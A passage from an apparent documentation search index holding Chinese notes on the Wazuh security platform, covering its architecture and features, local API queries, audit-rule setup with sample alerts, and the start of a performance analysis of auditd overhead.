\n\n\n\n\n\u76d1\u63a7\u6587\u4ef6\u5185\u5bb9\u3001\u6743\u9650\u3001\u7528\u6237\u3001\u5c5e\u6027\u7684\u6539\u52a8\u3002\u7531syscheck\u6a21\u5757\u5b8c\u62103.4\u4e4b\u540e\u7684\u7248\u672c\u8fd8\u589e\u52a0\u4e86\u5bf9\u4fee\u6539\u6587\u4ef6\u7684\u8fdb\u7a0b\u548c\u7528\u6237\u7684\u76d1\u63a7\u529f\u80fd(Auditing who-data)\u3002\n\n\n\n\n\u6076\u610f\u8f6f\u4ef6\u548c\u5f02\u5e38\u884c\u4e3a\u68c0\u6d4b(Anomaly and malware detection)    \n\n\n\n\n\u68c0\u6d4b\u6076\u610f\u8f6f\u4ef6\uff0c\u548c\u6076\u610f\u884c\u4e3a\u3002\u4e3b\u8981\u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u3001\u6587\u4ef6\u76d1\u63a7\u3001\u9690\u85cf\u7aef\u53e3\u3001\u7cfb\u7edf\u8c03\u7528\u76d1\u63a7\u7b49\u624b\u6bb5\u3002\u7531rootcheck\u548csyscheck\u5b8c\u6210\u3002\n\n\n\n\n\u914d\u7f6e\u5b89\u5168\u8bc4\u4f30(Security Configuration Assessment, SCA)\n\n\n\n\n\u4e3b\u8981\u4f9d\u636eSCAP\u3001CIS Benchmark \u7b49\u6807\u51c6\u5b89\u5168\u7b56\u7565\u5bf9\u7cfb\u7edf\u914d\u7f6e\u8fdb\u884c\u5b89\u5168\u8bc4\u4f30(\u4f9d\u8d56OpenSCAP\uff0cCIS-CAT)\n\n\n\n\n\u5b89\u5168\u7b56\u7565\u76d1\u63a7(Monitoring security policies)\n\n\n\n\n\u4e3b\u8981\u4f9d\u8d56Rootcheck\u3001OpenSCAP\u3001CIS-CAT\u5bf9\u7cfb\u7edf\u5b89\u5168\u7b56\u7565\u76d1\u63a7\n\n\n\n\n\u76d1\u63a7\u7cfb\u7edf\u8c03\u7528(Monitoring system calls)\n\n\n\n\n\u4f9d\u8d56Linux Audit System \uff0c\u5305\u62ec\u8bb0\u5f55\u67d0\u4e2a\u8fdb\u7a0b\u7684\u7cfb\u7edf\u8c03\u7528\u7b49\u529f\u80fd\u3002\n\n\n\n\n\u547d\u4ee4\u76d1\u63a7(Command monitoring)\n\n\n\n\n\u53ef\u4ee5\u76d1\u63a7\u6ca1\u6709\u65e5\u5fd7\u4ea7\u751f\u7684\u884c\u4e3a\uff0c\u6bd4\u5982\u76d1\u63a7\u547d\u4ee4\u7684\u8f93\u51fa\u5e76\u8f6c\u6362\u6210\u65e5\u5fd7\n\n\n\n\n\u6f0f\u6d1e\u68c0\u6d4b(Vulnerability detection)\n\n\n\n\n\u901a\u8fc7\u4e0b\u8f7d\u516c\u5f00\u7684\u6f0f\u6d1e\u4fe1\u606f\u5efa\u7acb\u6570\u636e\u5e93\uff0c\u4e0eAgent\u7684\u626b\u63cf\u4fe1\u606f(\u5e94\u7528\u53ca\u5176\u7248\u672c\u3001\u8865\u4e01)\u5339\u914d\uff0c\u5224\u65ad\u7cfb\u7edf\u662f\u5426\u5b58\u5728\u6f0f\u6d1e\u3002\n\n\n\n\nVirusTotal\u96c6\u6210(VirusTotal integration)\n\n\n\n\n\u96c6\u6210\u4e86VirusTotal\uff0c\u7528\u6765\u68c0\u6d4b\u6076\u610f\u6587\u6863\u548c\u75c5\u6bd2\u3002\n\n\n3.2 \u5927\u81f4\u6d41\u7a0b\n\n\nAgent\u4e0a\u9762\u53ea\u662f\u505a\u7b80\u5355\u7684\u65e5\u5fd7\u6536\u96c6\uff0c\u6bd4\u5982\u8fdb\u7a0b\u5217\u8868\u3001\u5b89\u88c5\u5305\u5217\u8868\u3001\u6587\u4ef6Hash\u3001\u65e5\u5fd7\u7b49\u7b49\uff0c\u7136\u540e\u89e3\u6790\u6210\u7edf\u4e00\u7684\u683c\u5f0f\u4e0a\u4f20\u5230\u670d\u52a1\u5668\uff0c\u670d\u52a1\u7aef\u57fa\u4e8e\u8fd9\u4e9b\u6570\u636e\uff0c\u5339\u914d\u81ea\u5df1\u7684\u89c4\u5219\u6765\u5224\u65ad\u6709\u6ca1\u6709\u5b89\u5168\u98ce\u9669\uff0c\u901a\u8fc7\u8b66\u544a\u7684\u65b9\u5f0f\u53d1\u5e03(\u5230\u90ae\u4ef6\uff0cWeb\u7ba1\u7406\u9762\u677f\u7b49)\n\n\n4.\u5e94\u7528\u90e8\u7f72\n\n\n4.1 \u5b89\u88c5\u90e8\u7f72\n\n\nhttps://documentation.wazuh.com/3.10/installation-guide/index.html\n\n\n4.2 \u529f\u80fd\u6d4b\u8bd5\n\n\n4.2.1 \u901a\u8fc7Wazuh-api\u67e5\u770bAgent\u4e0a\u5b89\u88c5\u7684Package\u5217\u8868\n\n\ncurl -u foo:bar -k -X GET \"http://127.0.0.1:55000/syscollector/001/packages?pretty&limit=2&offset=10&sort=-name\" \n\n\n\n\n\nroot@ubuntu:/var/ossec/etc/shared# curl -u foo:bar -k -X GET \"http://127.0.0.1:55000/syscollector/001/packages?pretty&limit=2&offset=10&sort=-name\"\n{\n   \"error\": 0,\n   \"data\": {\n      \"items\": [\n         {\n            \"scan\": {\n               \"id\": 447451738,\n               \"time\": \"2020/03/04 17:58:52\"\n            },\n            \"format\": \"deb\",\n            \"priority\": \"optional\",\n            \"name\": \"anacron\",\n            \"architecture\": \"amd64\",\n            \"version\": \"2.3-24\",\n            \"size\": 105,\n            \"vendor\": \"Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>\",\n            \"description\": \"cron-like program that doesn't go by time\",\n            \"section\": \"admin\"\n         },\n         {\n            \"scan\": {\n               \"id\": 447451738,\n               \"time\": \"2020/03/04 17:58:52\"\n            },\n            \"format\": \"deb\",\n            \"priority\": \"optional\",\n            \"name\": \"apg\",\n            \"architecture\": \"amd64\",\n            \"version\": \"2.2.3.dfsg.1-5\",\n            \"size\": 134,\n            \"vendor\": \"Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>\",\n            \"description\": \"Automated Password Generator - Standalone version\",\n            \"section\": \"admin\"\n         }\n      ],\n      \"totalItems\": 1627\n   }\n}\n\n\n\n\n\n4.2.2 \u901a\u8fc7Wazuh-api\u67e5\u770bAgent\u4e0a\u8fdb\u7a0b\u5217\u8868\n\n\nroot@ubuntu:/var/ossec/etc/shared# curl -u foo:bar -k -X GET \"http://127.0.0.1:55000/syscollector/001/processes?pretty&limit=2&offset=10&sort=-name\"\n{\n   \"error\": 0,\n   \"data\": {\n      \"items\": [\n         {\n            \"scan\": {\n               \"id\": 1897014416,\n               \"time\": \"2020/03/04 17:59:09\"\n            },\n            \"share\": 0,\n            \"pgrp\": 658,\n            \"egroup\": \"root\",\n            \"utime\": 11,\n            \"size\": 1137,\n            \"stime\": 21,\n            \"euser\": \"root\",\n            \"cmd\": \"/usr/sbin/acpid\",\n            \"suser\": \"root\",\n            \"fgroup\": \"root\",\n            \"session\": 658,\n            \"processor\": 0,\n            \"ppid\": 1,\n            \"rgroup\": \"root\",\n            \"nice\": 0,\n            \"nlwp\": 1,\n            \"priority\": 20,\n            \"sgroup\": \"root\",\n            \"pid\": \"658\",\n            \"tty\": 0,\n            \"state\": \"S\",\n            \"vm_size\": 4548,\n            \"resident\": 0,\n            \"tgid\": 658,\n            \"ruser\": \"root\",\n            \"name\": \"acpid\",\n            \"start_time\": 659\n         },\n         ...\n      ],\n      \"totalItems\": 328\n   }\n}\n\n\n\n\n\n4.2.3 \u901a\u8fc7Wazuh-api\u67e5\u770bAgent\u7684\u7cfb\u7edf\u8c03\u7528\u60c5\u51b5\n\n\n\u4f7f\u7528auditctl\u6dfb\u52a0rules\n\n\nauditctl -a always,exit -F arch=b64 -S execve -F euid=0 -F key=audit-wazuh-c\nauditctl -a always,exit -F arch=b64 -S execve -F euid=0 -F key=audit-wazuh-c\n\n\n\n\n\nagent\u914d\u7f6eSystem calls monitoring \u5e76\u91cd\u542f\n\n\n<localfile>\n  <log_format>audit</log_format>\n  <location>/var/log/audit/audit.log</location>\n</localfile>\n\n\n\n\n\n\u5728Server\u7684Alters\u65e5\u5fd7\u4e2d\u67e5\u770b\u7ed3\u679c\n\n\n** Alert 1584080579.5902420: - audit,audit_command,gdpr_IV_30.1.g,\n2020 Mar 12 23:22:59 (ubuntu-virtual-machine) 192.168.1.15->/var/log/audit/audit.log\nRule: 80792 (level 3) -> 'Audit: Command: /bin/cat'\ntype=SYSCALL msg=audit(1584080579.013:3751): arch=c000003e syscall=59 success=yes exit=0 a0=55ad181dcb80 a1=55ad181dcc20 a2=55ad181aa130 a3=55ad18191010 items=2 ppid=5022 pid=9174 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=5 comm=\"cat\" exe=\"/bin/cat\" key=\"audit-wazuh-c\" type=EXECVE msg=audit(1584080579.013:3751): argc=2 a0=\"cat\" a1=\"audit-keys\" type=CWD msg=audit(1584080579.013:3751): cwd=\"/var/ossec/etc/lists\" type=PATH msg=audit(1584080579.013:3751): item=0 name=\"/bin/cat\" inode=1048601 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0 type=PATH msg=audit(1584080579.013:3751): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=398521 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0 type=PROCTITLE msg=audit(1584080579.013:3751): proctitle=6361740061756469742D6B657973\naudit.type: SYSCALL\naudit.id: 3751\naudit.arch: c000003e\naudit.syscall: 59\naudit.success: yes\naudit.exit: 0\naudit.ppid: 5022\naudit.pid: 9174\naudit.auid: 1000\naudit.uid: 0\naudit.gid: 0\naudit.euid: 0\naudit.suid: 0\naudit.fsuid: 0\naudit.egid: 0\naudit.sgid: 0\naudit.fsgid: 0\naudit.tty: pts2\naudit.session: 5\naudit.command: cat\naudit.exe: /bin/cat\naudit.key: audit-wazuh-c\naudit.execve.a0: cat\naudit.execve.a1: audit-keys\naudit.cwd: /var/ossec/etc/lists\naudit.file.name: /bin/cat\naudit.file.inode: 1048601\naudit.file.mode: 0100755\n\n\n\n\n\n5.\u4ee3\u7801\u5206\u6790\n\n\n5.1 \u4ee3\u7801\u7ed3\u6784\u5206\u6790\n\n\n\u200b",
            "title": "Wazuh\u5206\u6790"
        },
        {
            "location": "/wazuh\u5206\u6790/#wazuh",
            "text": "",
            "title": "wazuh\u5206\u6790"
        },
        {
            "location": "/wazuh\u5206\u6790/#1",
            "text": "Wazuh\u662f\u4e00\u4e2a\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u7cfb\u7edf\u5b89\u5168\u68c0\u6d4b\u5e73\u53f0\uff0c\u5b83\u662f\u57fa\u4e8e\u53e6\u4e00\u4e2a\u5f00\u6e90\u9879\u76eeOSSEC HIDS\u53d1\u5c55\u51fa\u6765\u7684\uff0c\u5728OSSEC\u7684\u57fa\u7840\u4e0a\u96c6\u6210\u4e86Elastic Stack\u548cOpenSCAP\uff0c\u5e76\u589e\u52a0\u4e86\u5f88\u591a\u65b0\u7684\u7279\u6027\uff0c\u529f\u80fd\u66f4\u52a0\u5168\u9762\u3002",
            "title": "1.\u7b80\u4ecb"
        },
        {
            "location": "/wazuh\u5206\u6790/#2",
            "text": "Wazuh\u7684\u67b6\u6784\u7531Agent\u3001Server\u3001Elastic Stack\u4e09\u5927\u90e8\u5206\u7ec4\u6210\u3002",
            "title": "2.\u67b6\u6784\u6982\u8ff0"
        },
        {
            "location": "/wazuh\u5206\u6790/#21-agent",
            "text": "Agent\u4e3b\u8981\u529f\u80fd\uff1a   \u8fd0\u884c\u5728\u88ab\u76d1\u63a7\u7684\u7ec8\u7aef\u673a\u5668(Monitored Endpoint)\uff0c\u652f\u6301Windows\u3001Linux\u3001Solaris, BSD,  Mac\u7cfb\u7edf\u3002\u6536\u96c6\u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u7684\u6570\u636e\uff0c\u5e76\u53d1\u9001\u5230Wazuh server\u3002  \u53e6\u5916\uff0c\u672a\u5b89\u88c5Agent\u7684\u8bbe\u5907(Agentless devices, \u9632\u706b\u5899\uff0c\u8def\u7531\u5668\uff0c\u4ea4\u6362\u673a\u7b49)\uff0c\u4e5f\u53ef\u4ee5\u5411Wazuh server\u53d1\u9001\u65e5\u5fd7\u548c\u914d\u7f6e\u4fe1\u606f\u4f9b\u5176\u5206\u6790\u3002   Agent\u5305\u542b\u7684\u5b50\u6a21\u5757\uff1a   Rootcheck  rootkit\u68c0\u6d4b\u3001\u6076\u610f\u8f6f\u4ef6\u68c0\u6d4b\u3001\u7cfb\u7edf\u5f02\u5e38\u68c0\u6d4b\u3001\u7cfb\u7edf\u914d\u7f6e\u5b89\u5168\u68c0\u67e5  Log Collector  \u8bfb\u53d6\u7cfb\u7edf\u65e5\u5fd7\u3001\u5e94\u7528\u65e5\u5fd7\u3001\u7cfb\u7edf\u4e8b\u4ef6\u65e5\u5fd7\u7b49\u3002  Syscheck  \u6587\u4ef6\u5b8c\u6574\u6027\u68c0\u67e5(FIM)\u3001Windows\u6ce8\u518c\u8868\u76d1\u63a7\u7b49\u3002  OpenSCAP  \u626b\u63cf\u7cfb\u7edf\uff0c\u5bfb\u627e\u4e0d\u7b26\u5408OVAL\u3001XCCDF\u3001CIS benchmarks\u7b49\u6807\u51c6\u7684\u8f6f\u4ef6\u6f0f\u6d1e\u3001\u7cfb\u7edf\u914d\u7f6e  Agent Daemon  \u7528\u4e8e\u6c47\u603b\u5176\u4ed6\u7ec4\u4ef6\u7684\u7ed3\u679c\u3001\u538b\u7f29\u52a0\u5bc6\u53d1\u9001\u5230Wazuh server\u3002\u8fd0\u884c\u5728chroot\u3001\u662fAgent\u552f\u4e00\u8981\u8054\u7f51\u7684\u7ec4\u4ef6\u3002",
            "title": "2.1 Agent"
        },
        {
            "location": "/wazuh\u5206\u6790/#22-server",
            "text": "\u4e3b\u8981\u529f\u80fd: \u63a5\u6536Agent\u4f20\u8f93\u7684\u6570\u636e\uff0c\u5206\u6790\u6570\u636e\uff0c\u4ea7\u751f\u8b66\u62a5\uff0c\u8fd8\u5305\u62ec\u901a\u4fe1\u52a0\u5bc6\uff0cAgent\u7684\u8ba4\u8bc1\u7b49\u529f\u80fd\u3002  Server\u5305\u542b\u7684\u5b50\u6a21\u5757:   Registration service \u7528\u4e8e\u6ce8\u518c\u548c\u8ba4\u8bc1Agents  Remote daemon service \u7528\u6765\u63a5\u6536Agents\u4e0a\u4f20\u7684\u6570\u636e  Analysis daemon \u5206\u6790\u5404\u79cd\u683c\u5f0f\u6570\u636e\u3001\u5339\u914d\u89c4\u5219\u3001\u4ea7\u751f\u8b66\u62a5\u7b49  RESTful API \u63d0\u4f9b\u7ba1\u7406\u3001\u914d\u7f6eAgents\uff0c\u67e5\u770bAgents\u72b6\u6001\u7684\u63a5\u53e3\uff0c\u4ee5\u53caKibana\u53ef\u89c6\u5316\u9700\u8981\u7684\u63a5\u53e3",
            "title": "2.2  Server"
        },
        {
            "location": "/wazuh\u5206\u6790/#23-elastic-stack",
            "text": "\u5305\u62ecElasticsearch\u3001Kibana\u3001Logstash\u7b49\u5957\u4ef6\uff0c\u7528\u6765\u5904\u7406Server\u6536\u96c6\u5230\u7684\u6240\u6709\u6570\u636e\u3002   Elasticsearch \u7528\u4e8e\u5168\u6587\u68c0\u7d22  Logstach \u5904\u7406\u65e5\u5fd7\u6570\u636e  Kibana \u7528\u4e8eWeb\u53ef\u89c6\u5316  Filebeat \u7528\u4e8e\u65e5\u5fd7\u6570\u636e\u7684\u4f20\u8f93",
            "title": "2.3 Elastic Stack"
        },
        {
            "location": "/wazuh\u5206\u6790/#24",
            "text": "2.4.1 MessageQueue  \u5404\u4e2a\u6a21\u5757\u4f1a\u901a\u8fc7Unix-domain socket\u7ed1\u5b9a\u5230\u6587\u4ef6\u4f5c\u4e3a\u6d88\u606f\u961f\u5217\u6765\u8fdb\u884c\u8fdb\u7a0b\u95f4\u901a\u4fe1Agent\u7684MQ\u4f4d\u4e8e/var/ossec/queue\u76ee\u5f55\u4e0b",
            "title": "2.4 \u6a21\u5757\u95f4\u901a\u4fe1"
        },
        {
            "location": "/wazuh\u5206\u6790/#3",
            "text": "",
            "title": "3.\u5177\u4f53\u529f\u80fd"
        },
        {
            "location": "/wazuh\u5206\u6790/#31",
            "text": "\u65e5\u5fd7\u6536\u96c6(Log data collection)   \u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\uff0c\u914d\u7f6e\u5177\u4f53\u8981\u76d1\u63a7\u7684\u65e5\u5fd7\u6587\u4ef6   \u6587\u4ef6\u5b8c\u6574\u6027\u76d1\u63a7(FIM, File integrity monitoring)      \u76d1\u63a7\u6587\u4ef6\u5185\u5bb9\u3001\u6743\u9650\u3001\u7528\u6237\u3001\u5c5e\u6027\u7684\u6539\u52a8\u3002\u7531syscheck\u6a21\u5757\u5b8c\u62103.4\u4e4b\u540e\u7684\u7248\u672c\u8fd8\u589e\u52a0\u4e86\u5bf9\u4fee\u6539\u6587\u4ef6\u7684\u8fdb\u7a0b\u548c\u7528\u6237\u7684\u76d1\u63a7\u529f\u80fd(Auditing who-data)\u3002   \u6076\u610f\u8f6f\u4ef6\u548c\u5f02\u5e38\u884c\u4e3a\u68c0\u6d4b(Anomaly and malware detection)       \u68c0\u6d4b\u6076\u610f\u8f6f\u4ef6\uff0c\u548c\u6076\u610f\u884c\u4e3a\u3002\u4e3b\u8981\u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u3001\u6587\u4ef6\u76d1\u63a7\u3001\u9690\u85cf\u7aef\u53e3\u3001\u7cfb\u7edf\u8c03\u7528\u76d1\u63a7\u7b49\u624b\u6bb5\u3002\u7531rootcheck\u548csyscheck\u5b8c\u6210\u3002   \u914d\u7f6e\u5b89\u5168\u8bc4\u4f30(Security Configuration Assessment, SCA)   \u4e3b\u8981\u4f9d\u636eSCAP\u3001CIS Benchmark \u7b49\u6807\u51c6\u5b89\u5168\u7b56\u7565\u5bf9\u7cfb\u7edf\u914d\u7f6e\u8fdb\u884c\u5b89\u5168\u8bc4\u4f30(\u4f9d\u8d56OpenSCAP\uff0cCIS-CAT)   \u5b89\u5168\u7b56\u7565\u76d1\u63a7(Monitoring security policies)   \u4e3b\u8981\u4f9d\u8d56Rootcheck\u3001OpenSCAP\u3001CIS-CAT\u5bf9\u7cfb\u7edf\u5b89\u5168\u7b56\u7565\u76d1\u63a7   \u76d1\u63a7\u7cfb\u7edf\u8c03\u7528(Monitoring system calls)   \u4f9d\u8d56Linux Audit System \uff0c\u5305\u62ec\u8bb0\u5f55\u67d0\u4e2a\u8fdb\u7a0b\u7684\u7cfb\u7edf\u8c03\u7528\u7b49\u529f\u80fd\u3002   \u547d\u4ee4\u76d1\u63a7(Command monitoring)   \u53ef\u4ee5\u76d1\u63a7\u6ca1\u6709\u65e5\u5fd7\u4ea7\u751f\u7684\u884c\u4e3a\uff0c\u6bd4\u5982\u76d1\u63a7\u547d\u4ee4\u7684\u8f93\u51fa\u5e76\u8f6c\u6362\u6210\u65e5\u5fd7   \u6f0f\u6d1e\u68c0\u6d4b(Vulnerability detection)   \u901a\u8fc7\u4e0b\u8f7d\u516c\u5f00\u7684\u6f0f\u6d1e\u4fe1\u606f\u5efa\u7acb\u6570\u636e\u5e93\uff0c\u4e0eAgent\u7684\u626b\u63cf\u4fe1\u606f(\u5e94\u7528\u53ca\u5176\u7248\u672c\u3001\u8865\u4e01)\u5339\u914d\uff0c\u5224\u65ad\u7cfb\u7edf\u662f\u5426\u5b58\u5728\u6f0f\u6d1e\u3002   VirusTotal\u96c6\u6210(VirusTotal integration)   \u96c6\u6210\u4e86VirusTotal\uff0c\u7528\u6765\u68c0\u6d4b\u6076\u610f\u6587\u6863\u548c\u75c5\u6bd2\u3002",
            "title": "3.1 \u529f\u80fd\u5217\u8868"
        },
        {
            "location": "/wazuh\u5206\u6790/#32",
            "text": "Agent\u4e0a\u9762\u53ea\u662f\u505a\u7b80\u5355\u7684\u65e5\u5fd7\u6536\u96c6\uff0c\u6bd4\u5982\u8fdb\u7a0b\u5217\u8868\u3001\u5b89\u88c5\u5305\u5217\u8868\u3001\u6587\u4ef6Hash\u3001\u65e5\u5fd7\u7b49\u7b49\uff0c\u7136\u540e\u89e3\u6790\u6210\u7edf\u4e00\u7684\u683c\u5f0f\u4e0a\u4f20\u5230\u670d\u52a1\u5668\uff0c\u670d\u52a1\u7aef\u57fa\u4e8e\u8fd9\u4e9b\u6570\u636e\uff0c\u5339\u914d\u81ea\u5df1\u7684\u89c4\u5219\u6765\u5224\u65ad\u6709\u6ca1\u6709\u5b89\u5168\u98ce\u9669\uff0c\u901a\u8fc7\u8b66\u544a\u7684\u65b9\u5f0f\u53d1\u5e03(\u5230\u90ae\u4ef6\uff0cWeb\u7ba1\u7406\u9762\u677f\u7b49)",
            "title": "3.2 \u5927\u81f4\u6d41\u7a0b"
        },
        {
            "location": "/wazuh\u5206\u6790/#4",
            "text": "",
            "title": "4.\u5e94\u7528\u90e8\u7f72"
        },
        {
            "location": "/wazuh\u5206\u6790/#41",
            "text": "https://documentation.wazuh.com/3.10/installation-guide/index.html",
            "title": "4.1 \u5b89\u88c5\u90e8\u7f72"
        },
        {
            "location": "/wazuh\u5206\u6790/#42",
            "text": "4.2.1 \u901a\u8fc7Wazuh-api\u67e5\u770bAgent\u4e0a\u5b89\u88c5\u7684Package\u5217\u8868  curl -u foo:bar -k -X GET \"http://127.0.0.1:55000/syscollector/001/packages?pretty&limit=2&offset=10&sort=-name\"   root@ubuntu:/var/ossec/etc/shared# curl -u foo:bar -k -X GET \"http://127.0.0.1:55000/syscollector/001/packages?pretty&limit=2&offset=10&sort=-name\"\n{\n   \"error\": 0,\n   \"data\": {\n      \"items\": [\n         {\n            \"scan\": {\n               \"id\": 447451738,\n               \"time\": \"2020/03/04 17:58:52\"\n            },\n            \"format\": \"deb\",\n            \"priority\": \"optional\",\n            \"name\": \"anacron\",\n            \"architecture\": \"amd64\",\n            \"version\": \"2.3-24\",\n            \"size\": 105,\n            \"vendor\": \"Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>\",\n            \"description\": \"cron-like program that doesn't go by time\",\n            \"section\": \"admin\"\n         },\n         {\n            \"scan\": {\n               \"id\": 447451738,\n               \"time\": \"2020/03/04 17:58:52\"\n            },\n            \"format\": \"deb\",\n            \"priority\": \"optional\",\n            \"name\": \"apg\",\n            \"architecture\": \"amd64\",\n            \"version\": \"2.2.3.dfsg.1-5\",\n            \"size\": 134,\n            \"vendor\": \"Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>\",\n            \"description\": \"Automated Password Generator - Standalone version\",\n            \"section\": \"admin\"\n         }\n      ],\n      \"totalItems\": 1627\n   }\n}  4.2.2 \u901a\u8fc7Wazuh-api\u67e5\u770bAgent\u4e0a\u8fdb\u7a0b\u5217\u8868  root@ubuntu:/var/ossec/etc/shared# curl -u foo:bar -k -X GET \"http://127.0.0.1:55000/syscollector/001/processes?pretty&limit=2&offset=10&sort=-name\"\n{\n   \"error\": 0,\n   \"data\": {\n      \"items\": [\n         {\n            \"scan\": {\n               \"id\": 1897014416,\n               \"time\": \"2020/03/04 17:59:09\"\n            },\n            \"share\": 0,\n            \"pgrp\": 658,\n            \"egroup\": \"root\",\n            \"utime\": 11,\n            \"size\": 1137,\n            \"stime\": 21,\n            \"euser\": \"root\",\n            \"cmd\": \"/usr/sbin/acpid\",\n            \"suser\": \"root\",\n            \"fgroup\": \"root\",\n            \"session\": 658,\n            \"processor\": 0,\n            \"ppid\": 1,\n            \"rgroup\": \"root\",\n            \"nice\": 0,\n            \"nlwp\": 1,\n            \"priority\": 20,\n            \"sgroup\": \"root\",\n            \"pid\": \"658\",\n            \"tty\": 0,\n            \"state\": \"S\",\n            \"vm_size\": 4548,\n            \"resident\": 0,\n            \"tgid\": 658,\n            \"ruser\": \"root\",\n            \"name\": \"acpid\",\n            \"start_time\": 659\n         },\n         ...\n      ],\n      \"totalItems\": 328\n   }\n}  4.2.3 \u901a\u8fc7Wazuh-api\u67e5\u770bAgent\u7684\u7cfb\u7edf\u8c03\u7528\u60c5\u51b5  \u4f7f\u7528auditctl\u6dfb\u52a0rules  auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -F key=audit-wazuh-c\nauditctl -a always,exit -F arch=b64 -S execve -F euid=0 -F key=audit-wazuh-c  agent\u914d\u7f6eSystem calls monitoring \u5e76\u91cd\u542f  <localfile>\n  <log_format>audit</log_format>\n  <location>/var/log/audit/audit.log</location>\n</localfile>  \u5728Server\u7684Alters\u65e5\u5fd7\u4e2d\u67e5\u770b\u7ed3\u679c  ** Alert 1584080579.5902420: - audit,audit_command,gdpr_IV_30.1.g,\n2020 Mar 12 23:22:59 (ubuntu-virtual-machine) 192.168.1.15->/var/log/audit/audit.log\nRule: 80792 (level 3) -> 'Audit: Command: /bin/cat'\ntype=SYSCALL msg=audit(1584080579.013:3751): arch=c000003e syscall=59 success=yes exit=0 a0=55ad181dcb80 a1=55ad181dcc20 a2=55ad181aa130 a3=55ad18191010 items=2 ppid=5022 pid=9174 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts2 ses=5 comm=\"cat\" exe=\"/bin/cat\" key=\"audit-wazuh-c\" type=EXECVE msg=audit(1584080579.013:3751): argc=2 a0=\"cat\" a1=\"audit-keys\" type=CWD msg=audit(1584080579.013:3751): cwd=\"/var/ossec/etc/lists\" type=PATH msg=audit(1584080579.013:3751): item=0 name=\"/bin/cat\" inode=1048601 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0 type=PATH msg=audit(1584080579.013:3751): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=398521 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0 type=PROCTITLE msg=audit(1584080579.013:3751): proctitle=6361740061756469742D6B657973\naudit.type: SYSCALL\naudit.id: 3751\naudit.arch: c000003e\naudit.syscall: 59\naudit.success: yes\naudit.exit: 0\naudit.ppid: 5022\naudit.pid: 9174\naudit.auid: 1000\naudit.uid: 0\naudit.gid: 0\naudit.euid: 0\naudit.suid: 0\naudit.fsuid: 0\naudit.egid: 0\naudit.sgid: 0\naudit.fsgid: 0\naudit.tty: pts2\naudit.session: 5\naudit.command: cat\naudit.exe: /bin/cat\naudit.key: audit-wazuh-c\naudit.execve.a0: cat\naudit.execve.a1: audit-keys\naudit.cwd: /var/ossec/etc/lists\naudit.file.name: /bin/cat\naudit.file.inode: 1048601\naudit.file.mode: 0100755",
            "title": "4.2 \u529f\u80fd\u6d4b\u8bd5"
        },
        {
            "location": "/wazuh\u5206\u6790/#5",
            "text": "",
            "title": "5.\u4ee3\u7801\u5206\u6790"
        },
        {
            "location": "/wazuh\u5206\u6790/#51",
            "text": "\u200b",
            "title": "5.1 \u4ee3\u7801\u7ed3\u6784\u5206\u6790"
        },
        {
            "location": "/wazuh\u6027\u80fd\u5206\u6790/",
            "text": "wazuh\u6027\u80fd\u5206\u6790\n\n\n1.\u6982\u8ff0\n\n\n\u6d4b\u8bd5\u76ee\u6807\uff1a\u5206\u6790wazuh\u4f7f\u7528\u5ba1\u8ba1(auditd)\u8bb0\u5f55\u7cfb\u7edf\u8c03\u7528\u529f\u80fd\u7ed9\u7cfb\u7edf\u5e26\u6765\u7684\u6027\u80fd\u635f\u5931\u3002\n\n\n\u7ed3\u8bba\u5982\u4e0b\uff1a\n\n\n\n\n\u8fdb\u7a0b\u8fd0\u884c\u65f6\u8017\uff1a\u5f00\u542fwazuh\u7684\u5ba1\u8ba1\u8bb0\u5f55\u7cfb\u7edf\u8c03\u7528\u7684\u529f\u80fd\u540e\uff0c\u8fdb\u7a0b\u7684\u6267\u884c\u901f\u5ea6\u4f1a\u964d\u4f4e83.77%\u4e4b\u591a\uff0c\u4e14\u6027\u80fd\u635f\u5931\u4e3b\u8981\u6765\u81eaauditd\u3002\n\n\nCPU\u5360\u7528\u7387\uff1a\u5728\u5355\u6838CPU\u7cfb\u7edf\u4e0a\uff0c\u7cfb\u7edf\u5185\u6838CPU\u5360\u7528\u7387\u5e73\u5747\u4f1a\u589e\u52a06.8%\uff0c\u7528\u6237\u6001\u57fa\u672c\u65e0\u5f71\u54cd\n\n\n\n\n\u200b        \n      \n\n\n\u200b        \n      \n\n\n2.\u73af\u5883\n\n\n\u7cfb\u7edf\u4fe1\u606f:\n\n\n\"data\": {\n      \"os\": {\n         \"codename\": \"Bionic Beaver\",\n         \"major\": \"18\",\n         \"minor\": \"04\",\n         \"name\": \"Ubuntu\",\n         \"platform\": \"ubuntu\",\n         \"version\": \"18.04.3 LTS (Bionic Beaver)\"\n      },\n      \"hostname\": \"ubuntu-virtual-machine\",\n      \"version\": \"#32~18.04.1-Ubuntu SMP Mon Feb 3 14:05:59 UTC 2020\",\n      \"architecture\": \"x86_64\",\n      \"release\": \"5.3.0-40-generic\",\n      \"sysname\": \"Linux\"\n}\n\n\n\n\n\n\u786c\u4ef6\u4fe1\u606f:\n\n\n\"data\": {\n      \"cpu\": {\n         \"cores\": 1,\n         \"mhz\": 2495.391,\n         \"name\": \"Intel(R) Core(TM) i7-7660U CPU @ 2.50GHz\"\n      },\n      